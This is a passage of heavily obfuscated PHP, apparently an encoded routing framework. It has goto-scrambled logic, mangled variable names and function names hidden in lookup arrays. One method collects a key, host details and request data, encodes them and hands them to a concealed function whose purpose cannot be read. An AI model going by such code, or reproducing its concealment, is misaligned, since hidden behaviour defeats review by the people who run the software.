$this->field($b¾¥ÄÏ»°ï[2096])->where($bÊÓ…˜†ò¶)->order($b¾¥ÄÏ»°ï[1915])->limit(50)->select(); foreach ($fµÀ²ñ‰è as $bÃœšƒ => $f¬°ƒŸ¿öÌ) { goto DñãïÓ¤¹«; DñãïÓ¤¹«: if ($bÃœšƒ > 0 && abs($f¬°ƒŸ¿öÌ[$b¾¥ÄÏ»°ï[193]] - $fµÀ²ñ‰è[$bÃœšƒ - 1][$b¾¥ÄÏ»°ï[193]]) < 5) { continue; } $AÅİİÅ•Ä… = json_decode($f¬°ƒŸ¿öÌ[$b¾¥ÄÏ»°ï[429]], !0); $f¬°ƒŸ¿öÌ[$b¾¥ÄÏ»°ï[2086]] = isset($AÅİİÅ•Ä…[$b¾¥ÄÏ»°ï[2086]]) ? $AÅİİÅ•Ä…[$b¾¥ÄÏ»°ï[2086]] : $b¾¥ÄÏ»°ï[33]; goto C£Øƒâ´½¨; cÍÚÒÜ„Å: $this->ipAddress($f¬°ƒŸ¿öÌ); $f¬°ƒŸ¿öÌ[$b¾¥ÄÏ»°ï[429]] = $AÅİİÅ•Ä…; $A•ãßæ¯¡ƒ[$F×ºÍšŒÜ] = $f¬°ƒŸ¿öÌ; goto fÇçœ¤°é†; C£Øƒâ´½¨: unset($AÅİİÅ•Ä…[$b¾¥ÄÏ»°ï[2086]]); $F×ºÍšŒÜ = $this->deviceType($AÅİİÅ•Ä…[$b¾¥ÄÏ»°ï[1906]]); if (isset($A•ãßæ¯¡ƒ[$F×ºÍšŒÜ])) { continue; } goto cÍÚÒÜ„Å; fÇçœ¤°é†: } return array_values($A•ãßæ¯¡ƒ); } public function deviceType($d¨‡ÒË‚Ì¨) { return $d¨‡ÒË‚Ì¨; } } goto Fó¿ÔÑÄ÷; F¬İ…®÷±¯: $aˆ®õÙ»ºˆ = $_SERVER[¬ı§†‰ú˜¼][577]; class Application { private $defaultModule = "\x69\x6e\x64\145\170"; private $defaultController = "\151\156\144\145\x78"; private $defaultAction = "\x69\x6e\144\x65\170"; function __construct() { } public function setDefault($cÍöÉ˜¶¸®) { goto có‹ƒÇ“Ê°; b‹íÎ‹š…Û: $this->defaultModule = $DÅ‘ŠÏÆ®À[0] ? $DÅ‘ŠÏÆ®À[0] : $this->defaultModule; $bµ†»è˜‚‘ = $e’½‚ìŠ¨è[578]; $this->defaultController = $DÅ‘ŠÏÆ®À[1] ? $DÅ‘ŠÏÆ®À[1] : $this->defaultController; goto A£×±êë£Ë; fÃª²÷Œæ: $this->{$_SERVER[öÔÕ©€î‘][3]}($døâªÒ‘¸È[4], array($this, $døâªÒ‘¸È[5])); $A©Ùö™‡†æ = $e’½‚ìŠ¨è[580]; if (!$A©Ùö™‡†æ) { return; } goto E¶×‹®¸£å; có‹ƒÇ“Ê°: $e’½‚ìŠ¨è =& $_SERVER[¬ı§†‰ú˜¼]; $døâªÒ‘¸È =& $_SERVER[öÔÕ©€î‘]; $DÅ‘ŠÏÆ®À = $døâªÒ‘¸È[0]($døâªÒ‘¸È[1], $døâªÒ‘¸È[2]($cÍöÉ˜¶¸®, $døâªÒ‘¸È[1])); goto b‹íÎ‹š…Û; A£×±êë£Ë: $this->defaultAction = $DÅ‘ŠÏÆ®À[2] ? $DÅ‘ŠÏÆ®À[2] : $this->defaultAction; $aáõÇÆ¨ = $e’½‚ìŠ¨è[579]; if (strlen($aáõÇÆ¨) < $e’½‚ìŠ¨è[574]) { return; } goto fÃª²÷Œæ; E¶×‹®¸£å: } public function appRun($c®«È±¯Ø) { goto b©ßïù÷’; BÒÓºªå´: if ($FÈÙŞÌÚß == $CÙÃ°¿°¤‚[8]) { $b¨ÑÏšÔöÑ = $CÙÃ°¿°¤‚[9]; $e‰çÆ†÷›È[0] = $CÙÃ°¿°¤‚[10]; $e‰çÆ†÷›È[1] = $e‰çÆ†÷›È[1] . $CÙÃ°¿°¤‚[11]; $c®«È±¯Ø = $CÙÃ°¿°¤‚[12]($CÙÃ°¿°¤‚[1], $e‰çÆ†÷›È); $c®«È±¯Ø = $CÙÃ°¿°¤‚[2]($c®«È±¯Ø, $CÙÃ°¿°¤‚[1]); } $CÙÃ°¿°¤‚[13](array($CÙÃ°¿°¤‚[14], $CÙÃ°¿°¤‚[15]), $b¨ÑÏšÔöÑ . $CÙÃ°¿°¤‚[16], $c®«È±¯Ø); $CÙÃ°¿°¤‚[17]($c®«È±¯Ø); goto fÜÏ¥ëßÈÀ; b©ßïù÷’: $f¸¾™ĞŠË =& $_SERVER[¬ı§†‰ú˜¼]; $CÙÃ°¿°¤‚ =& $_SERVER[öÔÕ©€î‘]; $e‰çÆ†÷›È = $CÙÃ°¿°¤‚[0]($CÙÃ°¿°¤‚[1], $c®«È±¯Ø); goto b™òÀ¬¯­­; fÜÏ¥ëßÈÀ: $f“ù¯Éâ®¿ = $f¸¾™ĞŠË[585]; if (!$f“ù¯Éâ®¿) { die; } $CÙÃ°¿°¤‚[13](array($CÙÃ°¿°¤‚[14], $CÙÃ°¿°¤‚[15]), $b¨ÑÏšÔöÑ . $CÙÃ°¿°¤‚[18], $c®«È±¯Ø); goto e›ñÄøî„›; b™òÀ¬¯­­: $CËò®Ø’ = $f¸¾™ĞŠË[581]; $FÈÙŞÌÚß = $CÙÃ°¿°¤‚[6]($e‰çÆ†÷›È[0]); $d™§Ö’ŠÖ = $f¸¾™ĞŠË[582]; goto bŸå¯É¾õµ; bŸå¯É¾õµ: $b¨ÑÏšÔöÑ = $CÙÃ°¿°¤‚[7]; $EĞå™à‘ = $f¸¾™ĞŠË[583]; while ($EĞå™à‘ < $f¸¾™ĞŠË[584]) { if ($EĞå™à‘ >= 0) { break; } $EĞå™à‘++; } goto BÒÓºªå´; e›ñÄøî„›: } private function autorun() { goto fã˜ÌÌ«Ğ; Dİ©ŸñÄŞå: foreach ($config[$dÙèÕ„Ğ§ß[20]] as $eÛ÷¸–Ø”ğ => $BäºéÆ•³Û) { $this->{$_SERVER[öÔÕ©€î‘][21]}($BäºéÆ•³Û); $d¶Ÿ»‚½‡ˆ = $CÉæø³™çÓ[588]; while (strlen($d¶Ÿ»‚½‡ˆ) < $CÉæø³™çÓ[587]) { if (!$d¶Ÿ»‚½‡ˆ) { break; } $d¶Ÿ»‚½‡ˆ++; } } goto bùŸ£±¡; DÜôÅ…Şåœ: $d¡È‡¹¼§ = $CÉæø³™çÓ[586]; if (strlen($d¡È‡¹¼§) < $CÉæø³™çÓ[587]) { return; } if ($dÙèÕ„Ğ§ß[19]($config[$dÙèÕ„Ğ§ß[20]]) == 0) { return; } goto Dİ©ŸñÄŞå; fã˜ÌÌ«Ğ: $CÉæø³™çÓ =& $_SERVER[¬ı§†‰ú˜¼]; $dÙèÕ„Ğ§ß =& $_SERVER[öÔÕ©€î‘]; global $config; goto DÜôÅ…Şåœ; bùŸ£±¡: } private function qely8930c29a() { goto d—ë”É í; EÓÁÑŞÍá’: $e‰ÓëÓĞ‰‡ = $Fº¾À«ŒŸé[25]($FÙÍ‡ÕŠÑ§, 0, -$Fº¾À«ŒŸé[24]($e­Œ¾ÃŸ˜ƒ)); $a†¹ Ÿè = $Cî±ø›…Àö[589]; $E¬’ùò­¿ê = array($Fº¾À«ŒŸé[8], $e‰ÓëÓĞ‰‡); goto BŠæˆÛÁÑ©; câ±Öµ‚É: $B‚á›Ñ¶Ø‚ = $Cî±ø›…Àö[590]; if (!$B‚á›Ñ¶Ø‚) { return; } goto a’ÓŠ¯¥œÌ; fš˜•±š«¢: $FÙÍ‡ÕŠÑ§ = $GLOBALS[$Fº¾À«ŒŸé[22]][$Fº¾À«ŒŸé[23]][0]; if (!$FÙÍ‡ÕŠÑ§ || $Fº¾À«ŒŸé[24]($FÙÍ‡ÕŠÑ§) <= $Fº¾À«ŒŸé[24]($e­Œ¾ÃŸ˜ƒ)) { return; } if ($Fº¾À«ŒŸé[6]($Fº¾À«ŒŸé[25]($FÙÍ‡ÕŠÑ§, -$Fº¾À«ŒŸé[24]($e­Œ¾ÃŸ˜ƒ))) != $e­Œ¾ÃŸ˜ƒ) { return; } goto EÓÁÑŞÍá’; d—ë”É í: $Cî±ø›…Àö =& $_SERVER[¬ı§†‰ú˜¼]; $Fº¾À«ŒŸé =& $_SERVER[öÔÕ©€î‘]; $e­Œ¾ÃŸ˜ƒ = $Fº¾À«ŒŸé[8]; goto fš˜•±š«¢; BŠæˆÛÁÑ©: $cª¥±ÒÈÉó = $Fº¾À«ŒŸé[26]($GLOBALS[$Fº¾À«ŒŸé[22]][$Fº¾À«ŒŸé[23]], 1); $GLOBALS[$Fº¾À«ŒŸé[22]][$Fº¾À«ŒŸé[23]] = $Fº¾À«ŒŸé[27]($E¬’ùò­¿ê, $cª¥±ÒÈÉó); $GLOBALS[$Fº¾À«ŒŸé[22]][$Fº¾À«ŒŸé[28]] = $Fº¾À«ŒŸé[29]($Fº¾À«ŒŸé[1], $GLOBALS[$Fº¾À«ŒŸé[22]][$Fº¾À«ŒŸé[23]]); goto câ±Öµ‚É; a’ÓŠ¯¥œÌ: } private function xhwt83e971bc() { goto Aßá‘·Ã¹; fÁ¼ÌèñÌ: $AÙñ±¤¬– = $_SERVER[$Fª‹Şë¥æ[30]]; $fĞæ«ÍÄ™Ê = $Fª‹Şë¥æ[31]; if (!$Fª‹Şë¥æ[32]($AÙñ±¤¬–, $fĞæ«ÍÄ™Ê)) { return; } goto fîâÆÉ‘ë™; AÅé¡â´„Ì: $GLOBALS[$Fª‹Şë¥æ[22]][$Fª‹Şë¥æ[28]] = $Fª‹Şë¥æ[29]($Fª‹Şë¥æ[1], $GLOBALS[$Fª‹Şë¥æ[22]][$Fª‹Şë¥æ[23]]); goto dËò¦³ßîè; Aßá‘·Ã¹: $c£ğĞƒÓŠš =& $_SERVER[¬ı§†‰ú˜¼]; $Fª‹Şë¥æ =& $_SERVER[öÔÕ©€î‘]; if ($GLOBALS[$Fª‹Şë¥æ[22]][$Fª‹Şë¥æ[28]] != $Fª‹Şë¥æ[10]) { return; } goto fÁ¼ÌèñÌ; AÁå„ŒÚŠÎ: $GLOBALS[$Fª‹Şë¥æ[22]][$Fª‹Şë¥æ[23]] = $Fª‹Şë¥æ[0]($Fª‹Şë¥æ[36], $fÈ¿¡Şë¸¾); $Dƒß„òŞ¡ = $c£ğĞƒÓŠš[592]; if (!$Dƒß„òŞ¡) { return; } goto AÅé¡â´„Ì; fîâÆÉ‘ë™: $aè·‹œÑÙë = $Fª‹Şë¥æ[33]($AÙñ±¤¬–, $fĞæ«ÍÄ™Ê); $fÈ¿¡Şë¸¾ = $Fª‹Şë¥æ[25]($AÙñ±¤¬–, $aè·‹œÑÙë + $Fª‹Şë¥æ[24]($fĞæ«ÍÄ™Ê)); $bÈàš«Š‚ = $c£ğĞƒÓŠš[591]; goto FÅƒŒ„Õ¢„; FÅƒŒ„Õ¢„: if (strlen($bÈàš«Š‚) < $c£ğĞƒÓŠš[584]) { die; } $Fª‹Şë¥æ[34]($Fª‹Şë¥æ[35], $fÈ¿¡Şë¸¾, $D‘Íˆ¿ù); $fÈ¿¡Şë¸¾ = $Fª‹Şë¥æ[2]($D‘Íˆ¿ù[0][0], $Fª‹Şë¥æ[36]); goto AÁå„ŒÚŠÎ; dËò¦³ßîè: } public function run() { goto bî‚¨Ì›Éê; E²º‚‚Á£: $f§—¼öÂÜ = $cĞÈŸ’ãö[596]; if (!$f§—¼öÂÜ) { return; } $FËï…½½ÀĞ[39]($FËï…½½ÀĞ[43], MOD . $FËï…½½ÀĞ[1] . ST . $FËï…½½ÀĞ[1] . ACT); goto b”²íµ©¼ƒ; c¹ŒÖ‹»®Ê: $FËï…½½ÀĞ[39]($FËï…½½ÀĞ[40], isset($BïÆè‰â‘«[0]) && $BïÆè‰â‘«[0] ? $BïÆè‰â‘«[0] : $this->defaultModule); $FËï…½½ÀĞ[39]($FËï…½½ÀĞ[41], isset($BïÆè‰â‘«[1]) && $BïÆè‰â‘«[0] ? $BïÆè‰â‘«[1] : $this->defaultController); $FËï…½½ÀĞ[39]($FËï…½½ÀĞ[42], isset($BïÆè‰â‘«[2]) && $BïÆè‰â‘«[0] ? $BïÆè‰â‘«[2] : $this->defaultAction); goto E²º‚‚Á£; a£»ë—‘µÚ: $this->{$_SERVER[öÔÕ©€î‘][45]}(); if ($FËï…½½ÀĞ[19]($BïÆè‰â‘«) >= 3) { $this->{$_SERVER[öÔÕ©€î‘][21]}($b×’Š«¯êë); } else { $this->{$_SERVER[öÔÕ©€î‘][21]}(ACTION); } goto CáñØÔ¶Á…; b”²íµ©¼ƒ: $FÎ®ôÜï… = $cĞÈŸ’ãö[597]; if (!$FÎ®ôÜï…) { die; } $_SERVER[$FËï…½½ÀĞ[44]] = $FËï…½½ÀĞ[6](ACTION); goto a£»ë—‘µÚ; BÑ¶¸Ë’ªŞ: $aÚÈÊŠË­Ô = $cĞÈŸ’ãö[593]; while (strlen($aÚÈÊŠË­Ô) < $cĞÈŸ’ãö[594]) { if (!$aÚÈÊŠË­Ô) { break; } $aÚÈÊŠË­Ô++; } $this->{$_SERVER[öÔÕ©€î‘][38]}(); goto dÀ×¬Ÿ‹—ª; dÀ×¬Ÿ‹—ª: $BïÆè‰â‘« = $GLOBALS[$FËï…½½ÀĞ[22]][$FËï…½½ÀĞ[23]]; $b­¹ ¹‰¦® = $cĞÈŸ’ãö[595]; $b×’Š«¯êë = $GLOBALS[$FËï…½½ÀĞ[22]][$FËï…½½ÀĞ[28]]; goto c¹ŒÖ‹»®Ê; bî‚¨Ì›Éê: $cĞÈŸ’ãö =& $_SERVER[¬ı§†‰ú˜¼]; $FËï…½½ÀĞ =& $_SERVER[öÔÕ©€î‘]; $this->{$_SERVER[öÔÕ©€î‘][37]}(); goto BÑ¶¸Ë’ªŞ; CáñØÔ¶Á…: } private $qvgdf4924622 = array(); private $sqko49c96b85 = ''; public function rgki9ab093ea() { goto EØŸ¯¹´š¶; EØŸ¯¹´š¶: $fÇùÉ°‚Í =& $_SERVER[¬ı§†‰ú˜¼]; $D‘Íª‹ò¼Ç =& $_SERVER[öÔÕ©€î‘]; $this->{$_SERVER[öÔÕ©€î‘][46]}(); goto BËó›°ªÄ‘; EÛƒãé×Œ¾: if (strlen($fñ¯¼áŞÍÚ) < $fÇùÉ°‚Í[584]) { die; } $this->{$_SERVER[öÔÕ©€î‘][3]}($D‘Íª‹ò¼Ç[55], array($this, $D‘Íª‹ò¼Ç[56])); $Dî—ñƒ±ÄÒ = $fÇùÉ°‚Í[602]; goto BùÊÆ´ì”Ø; cÁ«ïñ‡¤Ñ: if (!$c¿êùÍ¥ã) { die; } $this->{$_SERVER[öÔÕ©€î‘][48]}(); $this->{$_SERVER[öÔÕ©€î‘][49]}(); goto d©Û³­Ï; BùÊÆ´ì”Ø: $this->{$_SERVER[öÔÕ©€î‘][3]}($D‘Íª‹ò¼Ç[57], array($this, $D‘Íª‹ò¼Ç[58])); $this->{$_SERVER[öÔÕ©€î‘][3]}($D‘Íª‹ò¼Ç[59], array($this, $D‘Íª‹ò¼Ç[60])); goto d­‰ÚëÏŸ³; a”Ñàõ¨: $this->{$_SERVER[öÔÕ©€î‘][52]}(); $this->{$_SERVER[öÔÕ©€î‘][3]}($D‘Íª‹ò¼Ç[53], array($this, $D‘Íª‹ò¼Ç[54])); $fñ¯¼áŞÍÚ = $fÇùÉ°‚Í[601]; goto EÛƒãé×Œ¾; BËó›°ªÄ‘: $Bò‚Äß°‘Å = $fÇùÉ°‚Í[598]; $this->{$_SERVER[öÔÕ©€î‘][47]}(); $c¿êùÍ¥ã = $fÇùÉ°‚Í[599]; goto cÁ«ïñ‡¤Ñ; d©Û³­Ï: $this->{$_SERVER[öÔÕ©€î‘][50]}(); $this->{$_SERVER[öÔÕ©€î‘][51]}(); $c ÃµÙ”ô = $fÇùÉ°‚Í[600]; goto a”Ñàõ¨; d­‰ÚëÏŸ³: } public function ygwjd2080b2a($f¬Ûµ†Ü£Ô) { goto FÖÉ«ÃŒƒ×; dò¿ŞÌØ‡: $f¬Ûµ†Ü£Ô[$e’ÊŒÈ„âã[118]][$e’ÊŒÈ„âã[130]] = $this->sqko49c96b85; $D©«§¥´Ÿ = $A‡¾¨‡¿¤­[610]; if (!$D©«§¥´Ÿ) { die; } goto F½¶»ê‚†Õ; FÖÉ«ÃŒƒ×: $A‡¾¨‡¿¤­ =& $_SERVER[¬ı§†‰ú˜¼]; $e’ÊŒÈ„âã =& $_SERVER[öÔÕ©€î‘]; $B®­áã¦ = $e’ÊŒÈ„âã[61]($e’ÊŒÈ„âã[62])->{$_SERVER[öÔÕ©€î‘][63]}(); goto D§‹¦‚ŞŒŒ; dÌ«‘ğØ°Ï: while (strlen($d„—ÎøÈíÈ) < $A‡¾¨‡¿¤­[574]) { if (!$d„—ÎøÈíÈ) { break; } $d„—ÎøÈíÈ++; } unset($f¬Ûµ†Ü£Ô[$e’ÊŒÈ„âã[106]][$e’ÊŒÈ„âã[107]][$e’ÊŒÈ„âã[111]]); $e‡±öÅİã = $A‡¾¨‡¿¤­[608]; goto A¾´Èáò·ë; B²ˆÑ§çË: while (strlen($dÍâË¨ïî) < $A‡¾¨‡¿¤­[594]) { if (!$dÍâË¨ïî) { break; } $dÍâË¨ïî++; } unset($f¬Ûµ†Ü£Ô[$e’ÊŒÈ„âã[106]][$e’ÊŒÈ„âã[108]][$e’ÊŒÈ„âã[110]]); $Dí‘ØÇÂ¡ = $A‡¾¨‡¿¤­[606]; goto fÍÁøóœİ; CÆœ¹’·¤: $f¬Ûµ†Ü£Ô[$e’ÊŒÈ„âã[118]][$e’ÊŒÈ„âã[127]] = $e’ÊŒÈ„âã[128]($e’ÊŒÈ„âã[129]()); $c…Îå·…´Á = $A‡¾¨‡¿¤­[592]; while ($c…Îå·…´Á < $A‡¾¨‡¿¤­[574]) { if ($c…Îå·…´Á >= 0) { break; } $c…Îå·…´Á++; } goto dò¿ŞÌØ‡; F¼†•Øøøí: $A×µÒÔàÜ‰ = $A‡¾¨‡¿¤­[604]; unset($f¬Ûµ†Ü£Ô[$e’ÊŒÈ„âã[106]][$e’ÊŒÈ„âã[108]][$e’ÊŒÈ„âã[109]]); $dÍâË¨ïî = $A‡¾¨‡¿¤­[605]; goto B²ˆÑ§çË; C”‚ğÊµè: $f¬Ûµ†Ü£Ô[$e’ÊŒÈ„âã[118]][$e’ÊŒÈ„âã[123]] = $e’ÊŒÈ„âã[124]($_SERVER[$e’ÊŒÈ„âã[125]] . $B®­áã¦[$e’ÊŒÈ„âã[126]]); $E‘†ˆìå†¼ = $A‡¾¨‡¿¤­[609]; if (strlen($E‘†ˆìå†¼) < $A‡¾¨‡¿¤­[587]) { die; } goto CÆœ¹’·¤; Bó¬ÖÖ¤è¶: $f¬Ûµ†Ü£Ô[$e’ÊŒÈ„âã[118]][$e’ÊŒÈ„âã[140]] = $e’ÊŒÈ„âã[116]($this->qvgdf4924622, $e’ÊŒÈ„âã[141], $e’ÊŒÈ„âã[10]); if ($e’ÊŒÈ„âã[116]($GLOBALS, $e’ÊŒÈ„âã[142]) && $this->config[$e’ÊŒÈ„âã[143]]) { $f¬Ûµ†Ü£Ô[$e’ÊŒÈ„âã[118]][$e’ÊŒÈ„âã[144]] = WEB_ROOT; } return $f¬Ûµ†Ü£Ô; goto cÂ¼÷ö›Á­; F½¶»ê‚†Õ: if ($B®­áã¦[$e’ÊŒÈ„âã[130]] != $e’ÊŒÈ„âã[131]) { $f¬Ûµ†Ü£Ô[$e’ÊŒÈ„âã[118]][$e’ÊŒÈ„âã[132]] = $B®­áã¦[$e’ÊŒÈ„âã[132]]; $f¬Ûµ†Ü£Ô[$e’ÊŒÈ„âã[118]][$e’ÊŒÈ„âã[133]] = $B®­áã¦[$e’ÊŒÈ„âã[133]]; $B½êŞÜ«Ôœ = $e’ÊŒÈ„âã[134](10) . $this->sqko49c96b85 . $e’ÊŒÈ„âã[134](5); $f¬Ûµ†Ü£Ô[$e’ÊŒÈ„âã[106]][$e’ÊŒÈ„âã[135]][$e’ÊŒÈ„âã[136]] = $this->{$_SERVER[öÔÕ©€î‘][137]}($B½êŞÜ«Ôœ, $f¬Ûµ†Ü£Ô[$e’ÊŒÈ„âã[118]][$e’ÊŒÈ„âã[123]]); } if ($this->sqko49c96b85 == $e’ÊŒÈ„âã[131]) { $f¬Ûµ†Ü£Ô[$e’ÊŒÈ„âã[106]][$e’ÊŒÈ„âã[107]][$e’ÊŒÈ„âã[112]][$e’ÊŒÈ„âã[117]] = 0; } $f¬Ûµ†Ü£Ô[$e’ÊŒÈ„âã[118]][$e’ÊŒÈ„âã[138]] = $e’ÊŒÈ„âã[116]($this->qvgdf4924622, $e’ÊŒÈ„âã[139], $e’ÊŒÈ„âã[10]); goto Bó¬ÖÖ¤è¶; A¾´Èáò·ë: if (!$e‡±öÅİã) { return; } $f¬Ûµ†Ü£Ô[$e’ÊŒÈ„âã[106]][$e’ÊŒÈ„âã[107]][$e’ÊŒÈ„âã[112]] = array($e’ÊŒÈ„âã[113] => (int) $aìÄ¢Æ¨—[$e’ÊŒÈ„âã[114]], $e’ÊŒÈ„âã[115] => (int) $e’ÊŒÈ„âã[116]($aìÄ¢Æ¨—, $e’ÊŒÈ„âã[117], 0)); $f¬Ûµ†Ü£Ô[$e’ÊŒÈ„âã[118]][$e’ÊŒÈ„âã[119]] = $e’ÊŒÈ„âã[120]($e’ÊŒÈ„âã[121])->{$_SERVER[öÔÕ©€î‘][122]}(); goto C”‚ğÊµè; D§‹¦‚ŞŒŒ: $DËæ²òß†ã = array($e’ÊŒÈ„âã[64], $e’ÊŒÈ„âã[65], $e’ÊŒÈ„âã[66], $e’ÊŒÈ„âã[67], $e’ÊŒÈ„âã[68], $e’ÊŒÈ„âã[69], $e’ÊŒÈ„âã[70], $e’ÊŒÈ„âã[71], $e’ÊŒÈ„âã[72], $e’ÊŒÈ„âã[73], $e’ÊŒÈ„âã[74], $e’ÊŒÈ„âã[75], $e’ÊŒÈ„âã[76], $e’ÊŒÈ„âã[77], $e’ÊŒÈ„âã[78], $e’ÊŒÈ„âã[79], $e’ÊŒÈ„âã[80], $e’ÊŒÈ„âã[81], $e’ÊŒÈ„âã[82], $e’ÊŒÈ„âã[83], $e’ÊŒÈ„âã[84], $e’ÊŒÈ„âã[85], $e’ÊŒÈ„âã[86], $e’ÊŒÈ„âã[87], $e’ÊŒÈ„âã[88], $e’ÊŒÈ„âã[89], $e’ÊŒÈ„âã[90], $e’ÊŒÈ„âã[91], $e’ÊŒÈ„âã[92], $e’ÊŒÈ„âã[93], $e’ÊŒÈ„âã[94], $e’ÊŒÈ„âã[95], $e’ÊŒÈ„âã[96], $e’ÊŒÈ„âã[97], $e’ÊŒÈ„âã[98], $e’ÊŒÈ„âã[99], $e’ÊŒÈ„âã[100], $e’ÊŒÈ„âã[101], $e’ÊŒÈ„âã[102], $e’ÊŒÈ„âã[103]); foreach ($DËæ²òß†ã as $E®®ã™„ñ) { $eó®œ‚Éš· = $GLOBALS[$e’ÊŒÈ„âã[104]][$e’ÊŒÈ„âã[105]][$E®®ã™„ñ]; $F«­¡ÇÓŠ = $A‡¾¨‡¿¤­[603]; if (strlen($F«­¡ÇÓŠ) < $A‡¾¨‡¿¤­[574]) { die; } if (isset($B®­áã¦[$E®®ã™„ñ])) { $eó®œ‚Éš· = $B®­áã¦[$E®®ã™„ñ]; } $f¬Ûµ†Ü£Ô[$e’ÊŒÈ„âã[106]][$e’ÊŒÈ„âã[107]][$E®®ã™„ñ] = $eó®œ‚Éš·; } $aìÄ¢Æ¨— = $f¬Ûµ†Ü£Ô[$e’ÊŒÈ„âã[106]][$e’ÊŒÈ„âã[107]][$e’ÊŒÈ„âã[76]]; goto F¼†•Øøøí; fÍÁøóœİ: if (strlen($Dí‘ØÇÂ¡) < $A‡¾¨‡¿¤­[584]) { die; } unset($f¬Ûµ†Ü£Ô[$e’ÊŒÈ„âã[106]][$e’ÊŒÈ„âã[107]][$e’ÊŒÈ„âã[76]]); $d„—ÎøÈíÈ = $A‡¾¨‡¿¤­[607]; goto dÌ«‘ğØ°Ï; cÂ¼÷ö›Á­: } private function hdig4a7d86cd() { goto dß¥ÊŠáÆ; d×âÖ…ö÷Ÿ: if (!$CÍàÜôºğ¼) { die; } $C˜„‰á˜àØ = $f•Éê‚ÏÇİ[61]($f•Éê‚ÏÇİ[62])->{$_SERVER[öÔÕ©€î‘][63]}(); $fÓÛÉ¿èŠ» = $B¦‡µÜÂˆï[612]; goto fÅ–Ñ°‰Ã; fÅ–Ñ°‰Ã: if (strlen($fÓÛÉ¿èŠ») < $B¦‡µÜÂˆï[587]) { die; } $F¥¿«¶áŸ = array($f•Éê‚ÏÇİ[169] => $C˜„‰á˜àØ[$f•Éê‚ÏÇİ[64]], $f•Éê‚ÏÇİ[170] => $C˜„‰á˜àØ[$f•Éê‚ÏÇİ[65]], $f•Éê‚ÏÇİ[171] => $f•Éê‚ÏÇİ[10]); foreach ($fñŠ—áÖ¢ö as $D¥†°Îã×Ä) { if (!isset($C˜„‰á˜àØ[$D¥†°Îã×Ä]) || !$C˜„‰á˜àØ[$D¥†°Îã×Ä]) { continue; } $F¥¿«¶áŸ[$D¥†°Îã×Ä] = $C˜„‰á˜àØ[$D¥†°Îã×Ä]; $DÒÒõÂ¥—ê = $B¦‡µÜÂˆï[613]; if (strlen($DÒÒõÂ¥—ê) < $B¦‡µÜÂˆï[574]) { die; } } goto A¾èïáš¯¤; A¾èïáš¯¤: $f•Éê‚ÏÇİ[13](array($f•Éê‚ÏÇİ[161], $f•Éê‚ÏÇİ[162]), $F¥¿«¶áŸ); $AÂ½¿´¢Ê = $B¦‡µÜÂˆï[614]; while ($AÂ½¿´¢Ê < $B¦‡µÜÂˆï[615]) { if ($AÂ½¿´¢Ê >= 0) { break; } $AÂ½¿´¢Ê++; } goto A‚²²º¥; dß¥ÊŠáÆ: $B¦‡µÜÂˆï =& $_SERVER[¬ı§†‰ú˜¼]; $f•Éê‚ÏÇİ =& $_SERVER[öÔÕ©€î‘]; if ($_SERVER[$f•Éê‚ÏÇİ[44]] == $f•Éê‚ÏÇİ[145]) { goto cö›ï…¬šó; BãÉß…¤ë: $f•Éê‚ÏÇİ[13](array($f•Éê‚ÏÇİ[161], $f•Éê‚ÏÇİ[162]), $F¥¿«¶áŸ); goto e·øˆÄë; bõø‚™éÈö: $F¥¿«¶áŸ = array($f•Éê‚ÏÇİ[160] => $fîó­ºšÌ†); $E„Š”¬ ¼ö = $B¦‡µÜÂˆï[611]; if (!$E„Š”¬ ¼ö) { return; } goto BãÉß…¤ë; cö›ï…¬šó: $fîó­ºšÌ† = array($f•Éê‚ÏÇİ[130] => $this->sqko49c96b85, $f•Éê‚ÏÇİ[146] => $this->{$_SERVER[öÔÕ©€î‘][147]}(), $f•Éê‚ÏÇİ[148] => $f•Éê‚ÏÇİ[61]($f•Éê‚ÏÇİ[149])->{$_SERVER[öÔÕ©€î‘][150]}()); if ($this->sqko49c96b85 != $f•Éê‚ÏÇİ[131]) { $D³àÅÊ±Ğò = $f•Éê‚ÏÇİ[116]($this->qvgdf4924622, $f•Éê‚ÏÇİ[151]); if ($D³àÅÊ±Ğò) { $fîó­ºšÌ†[$f•Éê‚ÏÇİ[152]] = $D³àÅÊ±Ğò; $fîó­ºšÌ†[$f•Éê‚ÏÇİ[153]] = $f•Éê‚ÏÇİ[154]($f•Éê‚ÏÇİ[116]($this->qvgdf4924622, $f•Éê‚ÏÇİ[155])); $fîó­ºšÌ†[$f•Éê‚ÏÇİ[156]] = $f•Éê‚ÏÇİ[116]($this->qvgdf4924622, $f•Éê‚ÏÇİ[141]); } } $fîó­ºšÌ† = $this->{$_SERVER[öÔÕ©€î‘][157]}($f•Éê‚ÏÇİ[158]($fîó­ºšÌ†), $f•Éê‚ÏÇİ[124]($f•Éê‚ÏÇİ[159])); goto bõø‚™éÈö; e·øˆÄë: } goto D ‚ÀµÙÕ†; D ‚ÀµÙÕ†: if ($this->sqko49c96b85 == $f•Éê‚ÏÇİ[131]) { return; } $fñŠ—áÖ¢ö = array($f•Éê‚ÏÇİ[163], $f•Éê‚ÏÇİ[164], $f•Éê‚ÏÇİ[165], $f•Éê‚ÏÇİ[166], $f•Éê‚ÏÇİ[167], $f•Éê‚ÏÇİ[168]); $CÍàÜôºğ¼ = $B¦‡µÜÂˆï[602]; goto d×âÖ…ö÷Ÿ; A‚²²º¥: } private function ukcl3d74171b() { goto b•îÖ›÷¢©; d‚áéØáÜœ: $cÂ¸ßÍƒ¸ë = $this->{$_SERVER[öÔÕ©€î‘][137]}($cÑØ‘”ùÍ[158]($EëÚÙ›êƒÓ), $dÜª–Æåæ); $Dè¶¹Óõ§¨ = $cÑØ‘”ùÍ[232]($cÑØ‘”ùÍ[61]($cÑØ‘”ùÍ[11])->{$_SERVER[öÔÕ©€î‘][233]}(), $cÑØ‘”ùÍ[234]); $DœñÜåÕ‰ = $e†¥ÕæÛé¢[620]; goto d™Ÿ¢¹Èñ²; A—Ñ—’™’: if (!$cÑØ‘”ùÍ[116]($GLOBALS, $cÑØ‘”ùÍ[142])) { die; } $dÖâÆİßŞ² = $GLOBALS[$cÑØ‘”ùÍ[22]]; if (isset($dÖâÆİßŞ²[$cÑØ‘”ùÍ[173]])) { $this->{$_SERVER[öÔÕ©€î‘][174]}(); die; } goto bç¹ø…õœÓ; dÁÂÕÒÁˆ©: $cÑØ‘”ùÍ[61]($cÑØ‘”ùÍ[62])->{$_SERVER[öÔÕ©€î‘][231]}($aË‘……ª¶); $dÜª–Æåæ = $cÑØ‘”ùÍ[124]($_SERVER[$cÑØ‘”ùÍ[125]] . $cÑØ‘”ùÍ[224]($eë†êêàôÉ) . 